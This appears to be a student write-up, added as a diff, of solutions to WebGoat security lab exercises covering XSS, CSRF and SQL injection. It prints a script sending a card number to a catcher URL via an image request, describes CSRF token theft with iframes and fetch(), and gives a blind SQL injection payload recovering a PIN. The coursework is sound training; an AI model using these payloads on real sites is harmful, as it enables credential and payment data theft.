@@ -1,0 +1,49 @@
+Part1:
+
+This part uses the vulnerability by phishing a fake login page that is required for the search functionality and as the victim for his/her username and password, once the user hits the submit button, a javascript function hack is triggered and the victim's credentials would be sent to the attacker's server through image post request. The source of the URL in the image is the attacker's server address instead of a real image. This is an XSS attack. vulnerability.
+
+Part2:
+
+Readable URL:
+
+http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=000
+
+<SCRIPT>
+
+var img = new Image;
+
+var cardNum = document.form.input1.value;
+
+img.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + cardNum;
+
+</SCRIPT>
+
+In this part, we are exploiting the user’s input field of three digits. This could trigger the javascript function that sends the user’s credit card to the attacker's server through an image post request. The source of the URL in the image is the attacker's server address instead of a real image. The credit card number of input is named "input2” which came from the inspection of the webpage
+
+Part3:
+
+This part is a CSRF exploit problem. The exploitable field is the “message” input box, and we can perform the attack using the <img> tag in HTML. For the src field, instead of using a URL of an actual image, we used a URL of our exploit’s API with corresponding values for the Screen, menu, and transfer parameters. The attack is executed when the user clicks on the message, concurrently, querying the exploit’s API.
+
+Part4:
+
+This part is a CSRF exploit problem. The exploitable field is the “message” input box. Similar to Part3, the <img> tag allows us to attempt to exploit the website and we replaced the source field with our exploit’s API. From “Network”, we noticed that the transfer requires a confirmation callback API to be completed. The confirmation is triggered with transfer=CONFIRMED in the callback API. Thus, we created a JavaScript that fetches (queries) the callback API. As a result, the program is exploited when the user clicks on the message and the confirmation callback API is automatically requested.
+
+Part5:
+
+In this CSRF exploit problem, the exploitable field is the “message” input. The exploit has two main steps. In the first step, we replaced <iframe> tag’s src field with our exploit’s URL and assigned the id of iframe to “frameId”. By setting the transfer parameter in the HTTP request to main (i.e. transfer=main), we may use onload functionality of iframe to call our getToken function. In the getToken() function, we may retrieve the contentDocument of frameId, and consequently the contents stored in the token element. After retrieving the token value, we assigned our exploiting API’s parameter with corresponding Menu, Screen, token, and transfer values, and requested the exploiting API with fetch(). The exploit is executed when the user clicks on the submitted messages.
+
+Part6:
+
+The SQL injection exploit can be realized through the usage of “OR 1=1” condition. Since 1=1 is always true, any condition before the OR will be ignored or bypassed, thus allowing us to select all user information from the database. The “--” is used to comment out the trailing single quotation mark in the original SQL command.
+
+Part7:
+
+In the first part, since the semicolons can be used to separate the execution of various SQL commands, we can interpret the update command as the second SQL command in the input box. After providing 101 as the userid in the first command and ending it with a semicolon, the update SQL command will be executed subsequently and set the salary of user 101 with $999 using the set and the where commands.
+
+In the second, similar usage of semicolon can be used to inject the database. After the first SQL query, the second SQL query creates a trigger (which is an event setting to the database) and configures the database to change the email of every new user to “ece568_22s@utoronto.ca.”
+
+part 8:
+
+101 and (select pin from credit where cc_number = 1234123412341234)=3318;
+
+In this SQL injection problem, we relied on the usage of AND condition. Since account number of 101 is always true, we could use (select pin from credit where cc_number = 1234123412341234) to see if the SQL query gives a valid output. We first started with the condition of (select pin from credit where cc_number = 1234123412341234) > 500 and increment the right side of > when we have a valid message. When reaching 3500, the SQL query returns us an invalid output. Then we know that the password is between 3000 and 3500. We continued the similar process with the hundredth, the tenth, and the unit digit until we located the password is equal to 3318. Thus, we have retrieved the password using blind numeric SQL injection and the AND command.
